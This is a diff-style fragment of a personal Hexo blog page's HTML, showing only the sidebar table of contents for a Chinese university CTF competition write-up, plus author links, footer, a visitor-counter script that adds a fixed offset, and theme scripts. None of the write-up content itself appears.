+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%B9%BF%E4%B8%9C%E7%9C%81%E5%A4%A7%E5%AD%A6%E7%94%9F%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E7%AB%9E%E8%B5%9BWP"><span class="nav-number">1.</span> <span class="nav-text">广东省大学生网络安全竞赛WP</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#001-%E6%B6%88%E5%A4%B1%E7%9A%84flag"><span class="nav-number">1.1.</span> <span class="nav-text">001. 消失的flag</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#003-unserialize-web"><span class="nav-number">1.2.</span> <span class="nav-text">003. unserialize_web</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Reverse"><span class="nav-number">1.3.</span> <span class="nav-text">Reverse</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#002-re2"><span class="nav-number">1.3.1.</span> <span class="nav-text">002. re2</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#misc"><span class="nav-number">1.4.</span> <span class="nav-text">misc</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#001-%E7%8C%9C%E4%B8%80%E7%8C%9C"><span class="nav-number">1.4.1.</span> <span class="nav-text">001. 猜一猜</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Crypto"><span class="nav-number">1.5.</span> <span class="nav-text">Crypto</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#001-encipher"><span class="nav-number">1.5.1.</span> <span class="nav-text">001. encipher</span></a></li></ol></li></ol></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="Xloudmax"
+      src="/images/avatar.png">
+  <p class="site-author-name" itemprop="name">Xloudmax</p>
+  <div class="site-description" itemprop="description">Welc0me t0 the base</div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">9</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+          
+        <span class="site-state-item-count">8</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+        <span class="site-state-item-count">5</span>
+        <span class="site-state-item-name">标签</span>
+      </div>
+  </nav>
+</div>
+  <div class="sidebar-button motion-element"><i class="fa fa-comment"></i>
+    Chat
+  </a>
+  </div>
+  <div class="links-of-author motion-element">
+      <span class="links-of-author-item">
+        <a href="https://github.com/xloudmax" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;xloudmax" rel="noopener" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="mailto:xloudmax@gmail.com" title="E-Mail → mailto:xloudmax@gmail.com" rel="noopener" target="_blank"><i class="fa fa-envelope fa-fw"></i>E-Mail</a>
+      </span>
+  </div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; Tue Mar 05 2024 08:00:00 GMT+0800 (GMT+08:00) – 
+  <span itemprop="copyrightYear">2024</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Xloudmax</span>
+</div>
+  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://mist.theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Mist</a> 强力驱动
+  </div>
+
+<div class="theme-info">
+  <div class="powered-by"></div>
+  <span class="post-count">博客全站共17.4k字</span>
+</div>
+
+
+    <script async src="//dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+    <span id="busuanzi_container_site_pv">总访问量<span id="busuanzi_value_site_pv"></span>次</span>
+    <span class="post-meta-divider">|</span>
+    <span id="busuanzi_container_site_uv">总访客数<span id="busuanzi_value_site_uv"></span>人</span>
+    <span class="post-meta-divider">|</span>
+<!-- 不蒜子计数初始值纠正 -->
+<script>
+$(document).ready(function() {
+
+    var int = setInterval(fixCount, 50);  // 50ms周期检测函数
+    var countOffset = 20000;  // 初始化首次数据
+
+    function fixCount() {            
+       if (document.getElementById("busuanzi_container_site_pv").style.display != "none")
+        {
+            $("#busuanzi_value_site_pv").html(parseInt($("#busuanzi_value_site_pv").html()) + countOffset); 
+            clearInterval(int);
+        }                  
+        if ($("#busuanzi_container_site_pv").css("display") != "none")
+        {
+            $("#busuanzi_value_site_uv").html(parseInt($("#busuanzi_value_site_uv").html()) + countOffset); // 加上初始数据 
+            clearInterval(int); // 停止检测
+        }  
+    }
+       	
+});
+</script> 
+
+        
+<div class="busuanzi-count">
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+    <span class="post-meta-item" id="busuanzi_container_site_uv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-user"></i>
+      </span>
+      <span class="site-uv" title="总访客量">
+        <span id="busuanzi_value_site_uv"></span>
+      </span>
+    </span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item" id="busuanzi_container_site_pv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-eye"></i>
+      </span>
+      <span class="site-pv" title="总访问量">
+        <span id="busuanzi_value_site_pv"></span>
+      </span>
+    </span>
+</div>
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  
+  <script color='0,0,255' opacity='0.5' zIndex='-1' count='99' src="/lib/canvas-nest/canvas-nest.min.js"></script>
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/muse.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+  <script defer src="/lib/three/three.min.js"></script>
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+  
+
+
+  
+<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"debug":false,"model":{"jsonPath":"/null"},"display":{"position":"right","width":400,"height":800},"mobile":{"show":true},"react":{"opacity":0.7},"log":false});</script></body>
+</html>
